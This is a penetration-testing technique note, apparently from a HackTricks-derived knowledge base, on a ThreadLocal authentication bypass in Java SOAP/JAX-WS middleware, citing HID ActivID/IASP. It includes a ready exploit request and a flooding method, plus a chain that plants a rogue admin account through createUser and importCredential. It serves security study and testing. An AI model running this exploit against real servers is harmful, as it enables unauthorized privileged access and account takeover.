---
title: "SOAP / JAX-WS Attacks"
type: technique
tags: [soap, jax-ws, java, weblogic, jboss, auth-bypass, threadlocal, web]
phase: exploitation
date_created: 2026-07-15
date_updated: 2026-07-15
sources: [hacktricks-web]
---

# SOAP / JAX-WS Attacks

## What it is

Java middleware (WebLogic, JBoss, GlassFish) that exposes SOAP/JAX-WS endpoints can leak authentication state across recycled worker threads. Some handlers store the authenticated `Subject`/`Principal` in a static `ThreadLocal` and only refresh it when a proprietary SOAP header is present. Because app servers reuse worker threads, a well-formed SOAP body WITHOUT that header makes the handler skip the identity update, so the request silently inherits the last privileged `Subject` that touched the same thread.

Real-world instance: HID ActivID/IASP (HID-PSA-2025-002), where `LoginHandler` sets `SubjectHolder` (a static ThreadLocal) on `mySubjectHeader` or console/SSP auth but never clears it.

## How it works

Worker-thread reuse + conditional identity refresh = a stale privileged `Subject` leaks to an unauthenticated request that happens to land on the same thread. The bug is a race, so exploitation floods header-less requests until one hits an "infected" thread.

## Methodology

### Recon
Unzip the deployed archive and read the descriptors to find the handler class, the SOAP header QName, and the backing EJB endpoints:

```bash
unzip *.ear
# read application.xml / web.xml / @WebService annotations and handler-chain XML
# e.g. LoginHandlerChain.xml -> handler class + header QName + endpoints
```

WSDL may be blocked on `?wsdl` while POSTs still work; brute-force `ServiceName?wsdl` and import into Burp Wsdler for baseline envelopes.

### Exploitation loop
1. Learn normal responses with a header-bearing request.
2. Generate authenticated context on many threads (spam `/ssp`, or log into `/aiconsole` as admin in another tab).
3. Flood header-less bodies with high parallelism + Keep-Alive until one lands on an infected thread and returns privileged data.

```http
POST /ac-iasp-backend-jaxws/UserManager HTTP/1.1
Host: target
Content-Type: text/xml;charset=UTF-8

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                  xmlns:jax="http://jaxws.user.frontend.iasp.service.actividentity.com">
  <soapenv:Header/>
  <soapenv:Body>
    <jax:findUserIds><arg0></arg0><arg1>spl*</arg1></jax:findUserIds>
  </soapenv:Body>
</soapenv:Envelope>
```

Chain: `getUsers` to leak, then `createUser` + `importCredential` to plant a rogue admin. Validate by attaching JDWP/BTrace and dumping `SubjectHolder.getSubject()` per request.

## Tools
- Burp Wsdler - import WSDL, generate baseline SOAP envelopes.
- JDWP / BTrace - live-dump `ThreadLocal` state per request to confirm the leak.

## Sources
- HackTricks (pentesting-web) (slug: hacktricks-web).
